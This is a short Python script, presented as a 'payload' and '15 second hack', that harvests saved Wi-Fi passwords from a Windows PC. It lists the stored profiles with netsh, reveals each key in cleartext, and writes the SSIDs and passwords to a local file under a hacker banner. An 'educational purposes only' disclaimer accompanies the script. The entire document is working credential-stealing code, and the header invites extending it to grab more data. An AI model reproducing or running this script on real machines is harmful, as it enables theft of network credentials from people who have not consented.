'''
* Create a payload that grabs wifi password from a pc
* A 15 second hack
* Can be tuned to grab more stuff
* Written by Martin Muguna Kaburu
* For educational purposes only
'''
import subprocess, codecs, os, time

class Grabber():
    if not os.path.exists("data"):
        os.mkdir("data")
        
    def grab_all(self):
        f = open((os.getcwd() + r'\data\ssid.txt'), 'w')
        f.write('''
        
        -----------------------------
        | 15 SECOND HACK BY MUGUNA  |
        -----------------------------
        \n

'''
)
        command = 'netsh wlan show profile'
        SSID_list = []
        CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = codecs.decode(CMD.stdout.read(), 'UTF-8')
        new_output = output.split('\n')
        for line in new_output:
            if 'All' in line:
                garbage, self.SSID = line.split(': ')
                self.SSID = self.SSID.strip('\r')
                SSID_list.append(self.SSID)
            else:
                pass
            
        for SSID in SSID_list:
            command = 'netsh wlan show profile key=clear '
            command = command + '"' + SSID + '"'
            str(command)
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = codecs.decode(CMD.stdout.read(), 'UTF-8')
            new_output = output.split('\n')
            for line in new_output:
                if 'Key' in line:
                    garbage, key = line.split(" :")
                    key = '\t[+] ' + SSID + ' : ' + key + '\n'
                    str(key)
                    f.write(key)
                    
                else:
                    pass
        f.write('''\n
[-] If Key value == 1:
        that SSID at the time it was used
            had no know security authentication...\n
[-] Written for educational purposes
        lets try and keep it that way coz
            The author is not liable for its misuse...\n

''')
        f.close()




if __name__ == '__main__':
    main = Grabber()
    main.grab_all()
